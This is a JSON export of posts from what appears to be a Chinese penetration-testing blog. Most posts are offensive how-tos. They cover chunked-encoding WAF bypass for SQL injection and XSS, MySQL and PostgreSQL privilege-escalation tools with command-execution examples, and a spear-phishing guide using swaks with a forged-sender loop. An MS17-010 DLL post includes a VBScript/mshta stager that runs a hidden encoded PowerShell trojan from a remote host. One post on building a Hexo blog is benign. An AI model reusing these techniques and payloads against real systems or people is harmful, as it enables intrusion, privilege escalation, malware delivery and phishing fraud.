[{"title":"Chunked-transfer-encoding","date":"2019-05-24T03:46:25.000Z","path":"2019/05/24/Chunked-transfer-encoding/","text":"0x01 分块传输编码概念维基百科对分块传输编码的描述： 分块传输编码（Chunked transfer encoding）是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由网页服务器发送给客户端应用（ 通常是网页浏览器）的数据可以分成多个部分。分块传输编码只在HTTP协议1.1版本（HTTP/1.1）中提供。（使用HTTP 1.0协议，服务器会主动放弃chunked编码。） 《HTTP权威指南》P373对分块传输编码的解释： 0x02 分块传输编码格式标准的分块传输编码格式如下： 1[chunk size][\\r\\n][chunk data][\\r\\n][chunk size][\\r\\n][chunk data][\\r\\n][chunk size = 0][\\r\\n][\\r\\n] chunk size是以十六进制的ASCII码表示，chunk数据以0长度的chunk块结束，也就是（30 0d 0a 0d 0a）。 以下格式也可被识别：1[chunk size;other data][\\r\\n][chunk data] 其中的分号之后的other data是无关数据。 0x03 分块传输例子一个简单的分块传输HTTP请求如下：123456789101112131415POST /inject.php HTTP/1.1Accept-Encoding: gzip,deflateTransfer-Encoding: chunkedConnection: closeAccept: */*Host: 172.20.10.2:8011Cache-Control: no-cacheContent-Type: application/x-www-form-urlencoded; charset=utf-8Content-Length: 486;kxebHid=123b;pAo6m123456789110 我们传输的数据主体id=123+12345678911分块后分别是6位和11位，上面的6和b就是块数据长度的16进制数，12345&gt;&gt;&gt; hex(6)'0x6'&gt;&gt;&gt; hex(11)'0xb'&gt;&gt;&gt; 我们在服务器输出参数id的值：123456789HTTP/1.1 200 OKDate: Fri, 24 May 2019 02:17:07 GMTServer: Apache/2.4.7 (Ubuntu)X-Powered-By: PHP/5.5.9-1ubuntu4.17Content-Length: 14Connection: closeContent-Type: text/html12312345678911 可见块数据被服务器自动解码合并输出。 0x04 分块传输应用根据分块传输原理，这种发包方式用于Bypass基于流量特征检测的WAF应该会很有作用。以SQL注入攻击为例，我们来分析下sqlmap最新版（2019.5.24下载的）如何利用分块传输绕过WAF进行SQL注入。 lib/core/common.py行5160的chunkSplitPostData()函数实现对数据主体进行分块传输编码：123456789101112131415161718192021222324252627282930313233343536def chunkSplitPostData(data): \"\"\" Convert POST data to chunked transfer-encoded data (Note: splitting done by SQL keywords) &gt;&gt;&gt; random.seed(0) &gt;&gt;&gt; chunkSplitPostData(\"SELECT username,password FROM users\") '5;4Xe90\\\\r\\\\nSELEC\\\\r\\\\n3;irWlc\\\\r\\\\nT u\\\\r\\\\n1;eT4zO\\\\r\\\\ns\\\\r\\\\n5;YB4hM\\\\r\\\\nernam\\\\r\\\\n9;2pUD8\\\\r\\\\ne,passwor\\\\r\\\\n3;mp07y\\\\r\\\\nd F\\\\r\\\\n5;8RKXi\\\\r\\\\nROM u\\\\r\\\\n4;MvMhO\\\\r\\\\nsers\\\\r\\\\n0\\\\r\\\\n\\\\r\\\\n' \"\"\" length = len(data) retVal = \"\" index = 0 while index &lt; length: chunkSize = randomInt(1) if index + chunkSize &gt;= length: chunkSize = length - index salt = randomStr(5, alphabet=string.ascii_letters + string.digits) while chunkSize: candidate = data[index:index + chunkSize] if re.search(r\"\\b%s\\b\" % '|'.join(HTTP_CHUNKED_SPLIT_KEYWORDS), candidate, re.I): chunkSize -= 1 else: break index += chunkSize retVal += \"%x;%s\\r\\n\" % (chunkSize, salt) retVal += \"%s\\r\\n\" % candidate retVal += \"0\\r\\n\\r\\n\" return retVal 如上可见，这里严格按照分块传输编码的规范，并对敏感关键词进行分割，敏感关键词在这里定义： lib/core/settings.py行808： 这几个关键词明显不够，我们可以根据自己的需要添加一下。 对了，还需要添加chunked的请求头，在lib/request/connect.py中： 尝试利用他的--chunked参数进行分块传输注入： 可见完美注入，再查看TCP流量： SQLMAP实现得很优雅。已经不需要自己来写tamper。 0x05 分块传输应用场景拓展基于HTTP的攻击方式怎么能只局限于SQL注入呢，其实绕过WAF进行XSS、CSRF、SSRF、命令注入等攻击都可以通过分块传输来实现。 1. 代理实现以XSS为例：使用代理实现请求体更改，已有人实现（https://github.com/4rat/sqlmap_chunked_proxy）： 运行脚本即监听9999端口，浏览器配置代理127.0.0.1:9999 。 进行XSS： 数据包情况： 服务器解析情况： 2. burp插件https://github.com/c0ny1/chunked-coding-converter 下图是一个最原始的XSS攻击数据包，这里尝试进行一次最原生的XSS攻击，流量特征非常明显了： 使用插件进行分块传输： 完美X进去： 0x06 参考 维基百科：《分块传输编码》 《HTTP权威指南》","tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://zi0n.cn/tags/HTTP/"},{"name":"Chunked","slug":"Chunked","permalink":"https://zi0n.cn/tags/Chunked/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://zi0n.cn/tags/渗透测试/"}]},{"title":"","date":"2019-05-24T03:42:36.000Z","path":"2019/05/24/Chunked-transfer-encoding/分块传输编码在WEB安全中的应用/","text":"分块传输编码在WEB安全中的应用 天创安全研究组-20190524 0x01 分块传输编码概念维基百科对分块传输编码的描述： 分块传输编码（Chunked transfer encoding）是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由网页服务器发送给客户端应用（ 通常是网页浏览器）的数据可以分成多个部分。分块传输编码只在HTTP协议1.1版本（HTTP/1.1）中提供。（使用HTTP 1.0协议，服务器会主动放弃chunked编码。） 《HTTP权威指南》P373对分块传输编码的解释： 0x02 分块传输编码格式标准的分块传输编码格式如下： 1[chunk size][\\r\\n][chunk data][\\r\\n][chunk size][\\r\\n][chunk data][\\r\\n][chunk size = 0][\\r\\n][\\r\\n] chunk size是以十六进制的ASCII码表示，chunk数据以0长度的chunk块结束，也就是（30 0d 0a 0d 0a）。 以下格式也可被识别：1[chunk size;other data][\\r\\n][chunk data] 其中的分号之后的other data是无关数据。 0x03 分块传输例子一个简单的分块传输HTTP请求如下：123456789101112131415POST /inject.php HTTP/1.1Accept-Encoding: gzip,deflateTransfer-Encoding: chunkedConnection: closeAccept: */*Host: 172.20.10.2:8011Cache-Control: no-cacheContent-Type: application/x-www-form-urlencoded; charset=utf-8Content-Length: 486;kxebHid=123b;pAo6m123456789110 我们传输的数据主体id=123+12345678911分块后分别是6位和11位，上面的6和b就是块数据长度的16进制数，12345&gt;&gt;&gt; hex(6)'0x6'&gt;&gt;&gt; hex(11)'0xb'&gt;&gt;&gt; 我们在服务器输出参数id的值：123456789HTTP/1.1 200 OKDate: Fri, 24 May 2019 02:17:07 GMTServer: Apache/2.4.7 (Ubuntu)X-Powered-By: PHP/5.5.9-1ubuntu4.17Content-Length: 14Connection: closeContent-Type: text/html12312345678911 可见块数据被服务器自动解码合并输出。 0x04 分块传输应用根据分块传输原理，这种发包方式用于Bypass基于流量特征检测的WAF应该会很有作用。以SQL注入攻击为例，我们来分析下sqlmap最新版（2019.5.24下载的）如何利用分块传输绕过WAF进行SQL注入。 lib/core/common.py行5160的chunkSplitPostData()函数实现对数据主体进行分块传输编码：123456789101112131415161718192021222324252627282930313233343536def chunkSplitPostData(data): \"\"\" Convert POST data to chunked transfer-encoded data (Note: splitting done by SQL keywords) &gt;&gt;&gt; random.seed(0) &gt;&gt;&gt; chunkSplitPostData(\"SELECT username,password FROM users\") '5;4Xe90\\\\r\\\\nSELEC\\\\r\\\\n3;irWlc\\\\r\\\\nT u\\\\r\\\\n1;eT4zO\\\\r\\\\ns\\\\r\\\\n5;YB4hM\\\\r\\\\nernam\\\\r\\\\n9;2pUD8\\\\r\\\\ne,passwor\\\\r\\\\n3;mp07y\\\\r\\\\nd F\\\\r\\\\n5;8RKXi\\\\r\\\\nROM u\\\\r\\\\n4;MvMhO\\\\r\\\\nsers\\\\r\\\\n0\\\\r\\\\n\\\\r\\\\n' \"\"\" length = len(data) retVal = \"\" index = 0 while index &lt; length: chunkSize = randomInt(1) if index + chunkSize &gt;= length: chunkSize = length - index salt = randomStr(5, alphabet=string.ascii_letters + string.digits) while chunkSize: candidate = data[index:index + chunkSize] if re.search(r\"\\b%s\\b\" % '|'.join(HTTP_CHUNKED_SPLIT_KEYWORDS), candidate, re.I): chunkSize -= 1 else: break index += chunkSize retVal += \"%x;%s\\r\\n\" % (chunkSize, salt) retVal += \"%s\\r\\n\" % candidate retVal += \"0\\r\\n\\r\\n\" return retVal 如上可见，这里严格按照分块传输编码的规范，并对敏感关键词进行分割，敏感关键词在这里定义： lib/core/settings.py行808： 这几个关键词明显不够，我们可以根据自己的需要添加一下。 对了，还需要添加chunked的请求头，在lib/request/connect.py中： 尝试利用他的--chunked参数进行分块传输注入： 可见完美注入，再查看TCP流量： SQLMAP实现得很优雅。已经不需要自己来写tamper。 0x05 分块传输应用场景拓展基于HTTP的攻击方式怎么能只局限于SQL注入呢，其实绕过WAF进行XSS、CSRF、SSRF、命令注入等攻击都可以通过分块传输来实现。 1. 代理实现以XSS为例：使用代理实现请求体更改，已有人实现（https://github.com/4rat/sqlmap_chunked_proxy）： 运行脚本即监听9999端口，浏览器配置代理127.0.0.1:9999 。 进行XSS： 数据包情况： 服务器解析情况： 2. burp插件https://github.com/c0ny1/chunked-coding-converter 下图是一个最原始的XSS攻击数据包，这里尝试进行一次最原生的XSS攻击，流量特征非常明显了： 使用插件进行分块传输： 完美X进去： 0x06 参考 维基百科：《分块传输编码》 《HTTP权威指南》","tags":[]},{"title":"驭风信息安全攻防竞技平台","date":"2018-09-05T17:46:25.000Z","path":"2018/09/06/YuFeng_AWD_Platform/","text":"驭风 ， 一款多样化, 可自定义的 “信息安全攻防竞技平台”（苏安天下信息安全攻防研究室 版权所有）。 后台比赛配置 后台登录 管理员登录web后台配置比赛相关信息 打开平台，根据页面提示进入后台管理页面： 默认账号密码信息如下： 账号：`admin@admin.com账号：123456` 进入后台后主界面如下： 比赛配置点击菜单栏赛队设置，进行比赛队伍配置： 设置完毕如下： 点击菜单栏比赛选项配置，进行比赛选项相关配置： 如下选择比赛靶场环境：（目前有18套靶场环境可选，附专项练习） 如下可以直接进行： 配置每队靶机数量 配置比赛时长 配置每轮flag自动刷新时间间隔 配置好相关参数后，点击提交配置并启动靶机。如此提交配置到服务器，并启动靶机，此时靶机无flag。 靶机启动完毕后，随时可以开始比赛。点击最下方的已提交配置，开始比赛按钮，开始比赛： 靶场相关 靶场统计 附靶场漏洞情况与通关参考文档： 比赛平台开发方向定位为框架式平台，赛方或教职工可自行添加比赛靶场或题目，或专项练习。靶场模板如下： 控制面板后台存在控制面板，可以进行以下操作： 关闭所有靶机 修复异常靶机 重置所有靶机的flag 还原指定队伍靶机 eg: 关闭所有靶机 查看flag面板可以查看每队此回合的flag值： 学员功能队员登录学员通过主页队员登录按钮登录： 登陆后如下： 学员可以在此页面直接看到自己当前的比赛状态如：比分、排名 比赛信息 比赛说明 查看网络拓扑 比赛过程 实例：攻击漏洞靶机，获取flag 提交flag 加固时间无法提交flag： 支持批量提交：123for i in `cat /f.txt|awk 'xxxxxx'`;do curl http://172.20.10.9/commit.php -d $i -m 3;done#post_data:ip=xxx.xxx.xxx.xxx&amp;flag=xxxxxxxxxxxx 实时排行榜 查看实时排行榜 统计分数，包括：各队总分(含防御得分)，防御得分，实时分数变化状态，攻击源，攻击事件发生时间，裁判机检测记录与扣分记录等 反作弊机制 查看违规记录 反作弊机制，可对违规严重的队伍进行一键还原靶机： 演示视频此是旧版，暂未有时间更新新版平台的功能演示视频。","tags":[{"name":"AWD","slug":"AWD","permalink":"https://zi0n.cn/tags/AWD/"},{"name":"开发","slug":"开发","permalink":"https://zi0n.cn/tags/开发/"}]},{"title":"fuck_postgres","date":"2018-09-03T17:46:25.000Z","path":"2018/09/04/fuck_postgres/","text":"前言PostgreSQL在国外的流行程度不亚于MySQL，简称postgres。比如你kali linux上的Metasploit数据库服务使用的就是PostgreSQL。 fuck_postgres不是什么黑客攻击工具，他并不是要去fuck什么，只用于便捷地使用PostgreSQL自定义函数来执行系统命令，适用于数据库管理员知道postgres密码却不知道ssh或RDP密码的时候在服务器执行系统命令。 一切攻击都是违法行为，非管理员请不要下载使用。使用此工具的一切违法行为与本人无关。经测试，sqlmap上对于postgres的–os-shell无效，so文件和dll文件也有问题，语句略坑，所以我抽时间写一个，方便各位“管理员”。 sqlmap该模块的写文件语句详见filesystem.py:1234567891011121314151617181920212223242526272829303132333435363738394041424344def stackedWriteFile(self, wFile, dFile, fileType, forceCheck=False): wFileSize = os.path.getsize(wFile) content = open(wFile, \"rb\").read() self.oid = randomInt() self.page = 0 self.createSupportTbl(self.fileTblName, self.tblField, \"text\") debugMsg = \"create a new OID for a large object, it implicitly \" debugMsg += \"adds an entry in the large objects system table\" logger.debug(debugMsg) # References: # http://www.postgresql.org/docs/8.3/interactive/largeobjects.html # http://www.postgresql.org/docs/8.3/interactive/lo-funcs.html inject.goStacked(\"SELECT lo_unlink(%d)\" % self.oid) inject.goStacked(\"SELECT lo_create(%d)\" % self.oid) inject.goStacked(\"DELETE FROM pg_largeobject WHERE loid=%d\" % self.oid) for offset in xrange(0, wFileSize, LOBLKSIZE): fcEncodedList = self.fileContentEncode(content[offset:offset + LOBLKSIZE], \"base64\", False) sqlQueries = self.fileToSqlQueries(fcEncodedList) for sqlQuery in sqlQueries: inject.goStacked(sqlQuery) inject.goStacked(\"INSERT INTO pg_largeobject VALUES (%d, %d, DECODE((SELECT %s FROM %s), 'base64'))\" % (self.oid, self.page, self.tblField, self.fileTblName)) inject.goStacked(\"DELETE FROM %s\" % self.fileTblName) self.page += 1 debugMsg = \"exporting the OID %s file content to \" % fileType debugMsg += \"file '%s'\" % dFile logger.debug(debugMsg) inject.goStacked(\"SELECT lo_export(%d, '%s')\" % (self.oid, dFile), silent=True) written = self.askCheckWrittenFile(wFile, dFile, forceCheck) inject.goStacked(\"SELECT lo_unlink(%d)\" % self.oid) return written filesystem.py line65，是将dll文件base64编码解码，整个写入到pg_largeobject的一个page，在linux某些版本一定会报错的。每page容量为4096字节，如果是hex，只能容纳2kb的数据。 工具特点 不限平台，可用于管理windows和linux上的postgres 不限版本，udf有效版本内可自行添加库文件到工具目录 hex+分段写入large obj，无page数据过大问题 。。。 USAGE1234567891011121314usage: fuck_postgres [-h] [-a HOST] [-o PORT] [-u USER] [-p PASSWD] [-d DATABASE] [-e EXECUTE]optional arguments: -h, --help show this help message and exit -a HOST, --host HOST pgsql server ip -o PORT, --port PORT pgsql Port -u USER, --user USER pgsql UserName -p PASSWD, --passwd PASSWD pgsql password -d DATABASE, --database DATABASE pgsql database -e EXECUTE, --execute EXECUTE command for UDF to execute 演示 管理PostgreSQL 9.2.24 running on linux 64： 1./fuck_postgres -a 192.168.0.30 -u postgres -p postgresu -e \"cat /etc/passwd\" 1./fuck_postgres -a 192.168.0.30 -u postgres -p postgres -e \"net user &amp; whoami\" 管理PostgreSQL 8.2.21 running on windows 32： 1fuck_postgres.exe -a 192.168.0.30 -u postgres -p postgres -e \"quser &amp; net user &amp; whoami\" 1fuck_postgres.exe -a 192.168.0.47 -u postgres -p postgres -e \"ls -al\" 已收录的postgres库文件 各版本源码地址：https://www.postgresql.org/ftp/source 以下来自@zcgonvh（https://www.t00ls.net/thread-30179-1-1.html） 我在拜读前辈文章时，叹服前辈对待技术研究的态度。 udf源文件在此(https://github.com/sqlmapproject/udfhack/) 在 linux 编译so文件简单许多，只需要一条命令：1gcc sys_eval.c -shared -fPIC -I$PGSRC/include/server -o /tmp/8.2_x64.so 其中$PGSRC 为 postgres 源码的路径或安装路径。 windows上编写 postgres 的 UDF 需要引用其提供的头文件，在 windows 下这些头文件的位置为： %PGDIR%\\include其中%PGDIR%为 postgres 的安装路径 而需要引用的头文件目录并不仅仅只有这个，以下两个目录也是必须的： 12%PGDIR%\\include\\server%PGDIR%\\include\\server\\port\\win32 这三个路径都需要加到工程的头文件目录列表中。同时，需要将 %PGDIR%\\lib添加至 lib 文件目录列表中。在编译时，必须使用 vs 进行编译，使用 vc6 编译会失败（原因未知）。同时也不能使用 release 模式生成，release 的某个选项会导致编译出的 dll 不能正常使用（vs2008 出现此情况，其余版本未测试）。为了防止对方未安装 vc 运行库，务必将 配置属性-&gt;C/C++-&gt;代码生成 中的 代码生成 选项修改为多线程/MT，以保证在任何情况下均能够正常运行。最后，为了尽可能的减小生成文件体积，需要修改 配置属性-&gt;链接器 中以下几个参数：清单文件-&gt;生成清单，修改为否 调试-&gt;生成调试信息，修改为否优化-&gt;引用，修改为是优化-&gt;启用 COMDAT 折叠，修改为是在 vs2008 下使用以上设置，编译成功。 另：建议将生成的动态链接库文件使用 UPX 进行压缩，这样可以有效地减少文件体积。UPX 的下载地址为：http://upx.sourceforge.net/#downloadupx 欢迎有vs环境的童鞋编译提交新的库文件。 参考鸣谢@zcgonvh @anlfi @bt2312 @Catchermana 下载Download fuck_postgresDownload udf","tags":[{"name":"提权","slug":"提权","permalink":"https://zi0n.cn/tags/提权/"},{"name":"数据库","slug":"数据库","permalink":"https://zi0n.cn/tags/数据库/"},{"name":"自动化","slug":"自动化","permalink":"https://zi0n.cn/tags/自动化/"}]},{"title":"邮件伪造钓鱼","date":"2018-09-03T09:20:25.000Z","path":"2018/09/03/mail_fishing/","text":"swaks是一款常用的邮件伪造工具。 Usage1swaks --data mail.eml --to users@target.com --from info@gov.cn 发送eml模板 邮件模板样例我是从qq邮箱导出的eml。例如：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253X-QQ-FEAT: 7sGdpf7C3fzESHd7oVXe8vTNdg7EJqcGPCMAlsIoeVPqxy1h1KhnkKAYEIvyY +LHEuF4GdIHbwhuL1TYd4ZDDb0iQtWdDrJbPqsudGxCiyfVhhFF+OCKm46jvfE/Wo3CnPj8 l0wVXV7edkw+Xc1dMO4Q3Cf3mZ1ZEJCIhAtVdMEXnk83Qhdw7FysfvmlTSq6eA+S+JR8Ekm lJC87nQUrOjhuzgD6Hu/UPZapyYMryYvT147S4fFlFTn47tqI4vO1DsV2ILMr/pyQpmntt5 cPKbiFERA2255Q08l+cT3n4N/YK+zzf1ly+g==X-QQ-SSF: 000100000000003000000000000000ZX-HAS-ATTACH: noX-QQ-BUSINESS-ORIGIN: 2X-Originating-IP: 8.8.8.8X-QQ-STYLE: X-QQ-mid: webmail279t1535959735t4417861From: \"admin\" &lt;mailadmin@admin.com&gt;To: \"users\" &lt;users@admin.com&gt;Subject: =?gb18030?B?o6jPtc2zzajWqqOp08rP5LTmtKLS0cL6?=Mime-Version: 1.0Content-Type: multipart/alternative; boundary=\"----=_NextPart_5B8CE2B7_0A235E88_6A493CCE\"Content-Transfer-Encoding: 8BitReply-To: mymail@qq.comX-Priority: 3Message-ID: &lt;tencent_2179DC92844959BE85CC290A42D48CF14409@qq.com&gt;X-QQ-MIME: TCMime 1.0 by TencentX-Mailer: QQMail 2.xX-QQ-Mailer: QQMail 2.xThis is a multi-part message in MIME format.------=_NextPart_5B8CE2B7_0A235E88_6A493CCEContent-Type: text/plain; charset=\"gb18030\"Content-Transfer-Encoding: base641/C+tLXE08O7p6O6DQoNCg0KxPq1xNPKz+TS0bOsuf3X7rTztOa0os/e1sajrA0KxPq/ycTczt63qL3TytXQwrXE08q8/qGjDQrOqsHLsdzD4tXi1tbH6b/2o6wNCtT2vNPE+rXE08rP5LTmtKKjrA0Kx+uwtNXVyOfPwrjxyr272Li0o6wNCs+1zbO9q9fUtq+9+NDQwKnI3aGjDQoNCg0KuPHKvaO60NXD+yMjuaS6xSMjye233dakusXC6w0KwP3I56O61cXI/SMjMDAyMDE4IyMzMDIxNzExOTcxMDEwMTIzMzMNCg0KDQrQu9C7xPq1xMXkus+joQ0K08q8/tbQ0MQ=------=_NextPart_5B8CE2B7_0A235E88_6A493CCEContent-Type: text/html; charset=\"gb18030\"Content-Transfer-Encoding: base64PGRpdj48ZGl2PtfwvrS1xNPDu6ejujwvZGl2PjxkaXY+PGJyPjwvZGl2PjxkaXY+xPq1xNPKz+TS0bOsuf3X7rTztOa0os/e1sajrDwvZGl2PjxkaXY+xPq/ycTczt63qL3TytXQwrXE08q8/qGjPC9kaXY+PGRpdj7OqsHLsdzD4tXi1tbH6b/2o6w8L2Rpdj48ZGl2PtT2vNPE+rXE08rP5LTmtKKjrDwvZGl2PjxkaXY+x+uwtNXVyOfPwrjxyr272Li0o6w8L2Rpdj48ZGl2Ps+1zbO9q9fUtq+9+NDQwKnI3aGjPC9kaXY+PGRpdj48YnI+PC9kaXY+PGRpdj648cq9o7rQ1cP7IyO5pLrFIyPJ7bfd1qS6xcLrPC9kaXY+PGRpdj7A/cjno7rVxcj9IyMwMDIwMTgjIzMwMjE3MTE5NzEwMTAxMjMzMzwvZGl2PjxkaXY+PGJyPjwvZGl2PjxkaXY+0LvQu8T6tcTF5LrPo6E8L2Rpdj48ZGl2PtPKvP7W0NDEPC9kaXY+PC9kaXY+PGRpdj48YnI+PC9kaXY+------=_NextPart_5B8CE2B7_0A235E88_6A493CCE-- Reply-To: mymail@qq.com是回件地址，可以自定义，from和to这些不必多说。 鱼叉式钓鱼：准备个user.txt是受害邮件集合如： 123456testxxx@chacuo.nettestxxx@chacuo.nettestxxx@chacuo.nettestxxx@chacuo.nettestxxx@chacuo.nettestxxx@chacuo.net 使用上述邮件模板即可。 1for i in `cat users.txt`;do echo $i;swaks --data mail.eml --to $i --from info@freebuf.com &gt;&gt; res.txt;done 效果如下图： 邮件伪造原理当前常用的电子邮件协议有SMTP、POP3、IMAP,默认状态下,分别通过TCP端口25、110和143建立连接。 通俗点说，SMTP是发信用的，POP3，IMAP是收信用的。IMAP比POP3在有些方面要强一点。 简单邮件传输协议（Simple Mail Transfer Protocol，SMTP），它用于发送方的邮件服务器发送报文到接收方邮件服务器。SMTP协议中,允许发件人伪造绝大多数的发件人特征信息。这就导致了可以伪造别人发送邮件。 数据传输过程中，SMTP协议主要是通过以下五个主要命令实现的。 a)Helo：与SMTP服务器处理邮件的进程开始通信。 b)Mail from：邮件发件人的信息，即黑客伪造的发件人地址信息。 c)Rcpt to：邮件接收人得信息，即黑客发送伪造邮件的目的邮箱地址。 d)Data：邮件正文内容。 e)Quit：退出邮件。 其中发件人的信息、邮件正文信息均是在发送过程中人为可控的数据。","tags":[{"name":"社会工程学","slug":"社会工程学","permalink":"https://zi0n.cn/tags/社会工程学/"}]},{"title":"custom_command_dll","date":"2018-02-09T12:46:25.000Z","path":"2018/02/09/custom_command_dll/","text":"custom command dll file，usually using in MS17_010。 Usagejust open the file and fill in what you want. eg: run taskmgr.exe add user: run a Trojancreate a Trojan with MSF or Cobalt Strike http://192.168.1.105:8080/test.txt 123456789&lt;script language=\"VBScript\"&gt; Function var_func() Dim var_shell Set var_shell = CreateObject(\"Wscript.Shell\") var_shell.run \"powershell.exe -nop -w hidden -encodedcommand JABzAD0A。。。。。。\", 0, true End Function var_func self.close&lt;/script&gt; set command like mshta http://192.168.1.105:8080/test.txt when you create the dll… then… Downloadcustom_cmd_dll.exe","tags":[{"name":"提权","slug":"提权","permalink":"https://zi0n.cn/tags/提权/"},{"name":"神器","slug":"神器","permalink":"https://zi0n.cn/tags/神器/"}]},{"title":"build_hexo_blog","date":"2018-02-08T12:46:25.000Z","path":"2018/02/08/build_hexo_blog/","text":"What is Hexo?Hexo is a fast, simple and powerful blog framework. You write posts in Markdown (or other languages) and Hexo generates static files with a beautiful theme in seconds. RequirementsInstalling Hexo is quite easy. However, you do need to have a couple of other things installed first: RequirementsInstalling Hexo is quite easy. However, you do need to have a couple of other things installed first: Node.js Git 12345678sudo npm install -g hexo //install hexomkdir hexo hexo init blog //create a root pathcd blognpm install npm install hexo-deployer-git --save //install hexo git plugingit config --global user.email \"your_email@example.com\" //add git user informationgit config --global user.name \"your-git-username\" login your github and create a New repository named：your-github-username.github.io edit /blog/_config.yml： vim _config.yml： Add the following contents to the configuration file at the end： 1234deploy: type: git repository: https://github.com/username/github-username.github.io.git branch: master config ssh pub key1ssh-keygen -t rsa -C \"your_email@example.com\" 1cat ~/.ssh/id_rsa.pub Github –&gt; Settings –&gt; SSH keys –&gt; add SSH key bind your domainadd a file named CNAME in path /blog/themes/your-theme-name/source1234vim CNAMEiwww.xxx.xxx:x then edit your domail，add a CNAME record @ to github-username.github.io. edit your articleadd a new .md file in dir /blog/source/_posts，the file contents usually like： 1234567891011---title: build_hexo_blogdate: 2018/2/8 20:46:25permalink: build_hexo_blog---......&lt;!-- more --&gt;...... publish your article12hexo g //generate local filehexo d //deploy your file to github upload your image:make sure the following code in your _config.yml file： 1post_asset_folder: true install the plugin:1npm install https://github.com/CodeFalling/hexo-asset-image --save then create a dir with the same name as the permalink of this article, copy your img to this dir. enjoy！！！！","tags":[{"name":"杂项","slug":"杂项","permalink":"https://zi0n.cn/tags/杂项/"}]},{"title":"fuck_mysql","date":"2018-02-08T11:46:25.000Z","path":"2018/02/08/fuck_mysql/","text":"README 工具功能如下 自动导出你的backdoor和mof文件， 自动判断mysql版本，根据版本不同导出UDF的DLL到不同目录，UDF提权 导出LPK.dll文件，劫持系统目录提权 写启动项提权 工具仅做方便使用，技术含量几乎没有。 用py脚本写的，也打包成exe了，个人用的还算顺手。 用法：123456789101112131415161718192021222324promote:PythonDemo v5est0r$ python root.py __ _ __ __ ____ ___ _ / _|_ _ ___| | _| \\/ |_ _/ ___| / _ \\| || |_| | | |/ __| |/ / |\\/| | | | \\___ \\| | | | | Author：v5est0r| _| |_| | (__| &lt;| | | | |_| |___) | |_| | |___|_| \\__,_|\\___|_|\\_\\_| |_|\\__, |____/ \\__\\_\\_____| |___/usage: root.py [-h] [-a HOST] [-o PORT] [-u USER] [-p PASSWD] [-e EXECUTE] [-m METHOD]fuckmysqloptional arguments: -h, --help show this help message and exit -a HOST, --host HOST MySQL server ip -o PORT, --port PORT MySQL Port -u USER, --user USER mysql UserName -p PASSWD, --passwd PASSWD mysql password -e EXECUTE, --execute EXECUTE command for UDF to execute -m METHOD, --method METHOD elevate method,eg:udf/mof/lpk/st 我在虚拟机演示打包好的exe远程提权，坛子的老哥们都是明白人，我就不多说了，直接上图： 远程模式默认UDF提权，也可以-m udf指定方式，-e ipconfig指定执行的cmd，默认执行whoami：1root.exe -a 192.168.1.105 -p root -e \"ver&amp;whoami\" -m udf 有时候UDF无效，我们使用LPK.dll劫持： 1root.exe -a 192.168.1.105 -p root -m lpk 验证一下lpk是否加上账户: 有时候UDF和LPK都无效，目标是windows2003，还有机会，可以MOF： 把你的木马的hex复制到同目录的hex.txt就行了，程序会导出木马到指定目录，并用mof执行。 每隔几秒就运行一次木马，有点尴尬，如何停止mof老司机都知道，我就不多说了。 有时候UDF和LPK都无效，那我们只能尝试被动写启动项： 1root.exe -a 192.168.1.105 -p root -m st 可能存在路径编码问题写不成功，你可以根据提示，用本地的MySQL连接上去，执行。 当然还有情况是远程提权，UDF不能创建plugin目录，网上流传的ADS流创建目录我是没有成功过，工具里加了ADS流创建目录的代码，那么我们删掉plugin目录，再远程试试： 如上图，那就不行了，那么这种情况下，如果你有shell，在shell里的本地模式执行，就不一样了。 本地模式：一般来说，php一般权限都是可以创建目录的，此处必须指定主机为localhost或127.0.0.1才会调用本地模式：1root.exe -a localhost -p root -e \"ver&amp;whoami\" -m udf Download fuck_mysql.exe","tags":[{"name":"提权","slug":"提权","permalink":"https://zi0n.cn/tags/提权/"},{"name":"数据库","slug":"数据库","permalink":"https://zi0n.cn/tags/数据库/"},{"name":"自动化","slug":"自动化","permalink":"https://zi0n.cn/tags/自动化/"}]}]